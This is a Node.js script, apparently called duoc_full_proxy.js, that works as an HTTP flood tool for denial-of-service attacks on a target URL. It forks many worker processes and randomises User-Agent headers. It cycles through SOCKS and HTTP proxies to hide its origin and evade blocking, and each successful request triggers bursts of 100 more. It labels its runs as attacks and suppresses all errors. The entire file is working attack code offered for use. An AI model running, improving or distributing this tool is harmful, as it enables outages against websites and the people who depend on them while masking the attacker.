require('events').EventEmitter.defaultMaxListeners = 0;
const request = require('request'),
    fs = require('fs'),
    { SocksProxyAgent } = require('socks-proxy-agent'),
    fakeUa = require('fake-useragent'),
    cluster = require('cluster');

let totalSent = 0;

async function main_process() {
    if (process.argv.length !== 7) {
        console.log(`Usage: node duoc_full_proxy.js <URL> <TIME> <THREADS> <bypass | proxy.txt> <RATE>`);
        process.exit(0);
    }

    const target = process.argv[2];
    const time = parseInt(process.argv[3]);
    const threads = parseInt(process.argv[4]);
    const proxyMode = process.argv[5];
    const rate = parseInt(process.argv[6]);

    Array.prototype.remove_by_value = function(val) {
        for (let i = 0; i < this.length; i++) {
            if (this[i] === val) {
                this.splice(i, 1);
                i--;
            }
        }
        return this;
    };

    let proxies = [];

    if (proxyMode === 'bypass') {
        console.log("ATTACK MODE: BYPASS (no proxy)");
    } else {
        console.log(`ATTACK MODE: USING PROXIES from file: ${proxyMode}`);
        try {
            const data = fs.readFileSync(proxyMode, 'utf-8');
            proxies = data.replace(/\r/g, '').split('\n').filter(p => p.trim() !== '');
        } catch (err) {
            console.error("Could not read proxy file:", err.message);
            process.exit(1);
        }
    }

    function createAgent(proxy) {
        if (proxy.startsWith('socks4://') || proxy.startsWith('socks5://')) {
            return new SocksProxyAgent(proxy);
        } else {
            return proxy.startsWith('http://') ? proxy : 'http://' + proxy;
        }
    }

    function run() {
        const config = {
            method: 'GET',
            url: target,
            headers: {
                'Cache-Control': 'no-cache',
                'User-Agent': fakeUa()
            }
        };

        if (proxyMode !== 'bypass') {
            if (proxies.length === 0) {
                console.log("No more proxies available.");
                process.exit(0);
            }

            const rawProxy = proxies[Math.floor(Math.random() * proxies.length)];
            const proxy = rawProxy.includes('://') ? rawProxy : 'http://' + rawProxy;
            const agent = createAgent(proxy);

            let requestOptions = {
                url: config.url,
                method: config.method,
                headers: config.headers
            };

            if (typeof agent === 'string') {
                requestOptions.proxy = agent;
            } else {
                requestOptions.agent = agent;
            }

            request(requestOptions, function (error, response) {
                if (error || !response) {
                    console.warn(`[${rawProxy}] ERROR: ${error ? error.code : 'No response'} → switching proxy`);
                    proxies = proxies.remove_by_value(rawProxy);
                    return run();
                }

                console.log(response.statusCode, rawProxy);

                if (response.statusCode >= 200 && response.statusCode <= 226) {
                    totalSent++;
                    for (let i = 0; i < 100; i++) {
                        request(requestOptions, () => totalSent++);
                    }
                } else {
                    console.warn(`[${rawProxy}] BLOCKED with status ${response.statusCode} → removing`);
                    proxies = proxies.remove_by_value(rawProxy);
                    return run();
                }
            });

        } else {
            request(config, function (error, response) {
                if (response && response.statusCode >= 200 && response.statusCode <= 226) {
                    totalSent++;
                    console.log(response.statusCode, "HTTP_RAW");
                }
            });
        }
    }

    function thread() {
        setInterval(() => {
            for (let i = 0; i < rate; i++) {
                run();
            }
        }, 1000);
    }

    async function main() {
        if (cluster.isMaster) {
            for (let i = 0; i < threads; i++) {
                cluster.fork();
                console.log(`Started thread: ${i + 1}`);
            }

            cluster.on('exit', () => {
                cluster.fork();
            });

            setInterval(() => {
                console.log(`[STATS] Requests sent: ${totalSent}`);
            }, 5000);

        } else {
            thread();
        }
    }

    main();

    setTimeout(() => {
        console.log('Attack End');
        console.log(`Total requests sent: ${totalSent}`);
        process.exit(0);
    }, time * 1000);
}

process.on('uncaughtException', function () {});
process.on('unhandledRejection', function () {});

main_process();
